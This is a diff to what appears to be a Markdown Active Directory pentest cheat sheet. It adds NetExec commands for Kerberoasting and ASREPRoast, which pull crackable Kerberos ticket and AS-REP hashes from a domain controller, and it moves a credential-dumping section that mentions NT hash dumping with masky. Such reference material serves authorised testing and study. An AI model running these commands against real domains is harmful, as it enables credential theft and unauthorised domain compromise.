@@ -811,15 +811,26 @@ u.objectid ENDS WITH "-548" RETURN q
   ```
 </details> 
 
-# Credential dumping
-
+# Kerberoasting & ASREPRoast
 <details>
-  <summary> Domain authentication </summary> 
+  <summary> Roast </summary> 
 
   ### Kerberoasting
   ```shell
   NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --kerberoasting <output>.txt
   ```
+
+  ### ASREPRoast
+  ```shell
+  NetExec ldap <Domain_Controller_IP> -u <username> -p '' --asreproast <output>.txt
+  ```
+
+</details> 
+
+# Credential dumping
+
+<details>
+  <summary> Domain authentication </summary> 
 
   ### Dump NT:hash with masky with domain user
   ### Get ADCS server name
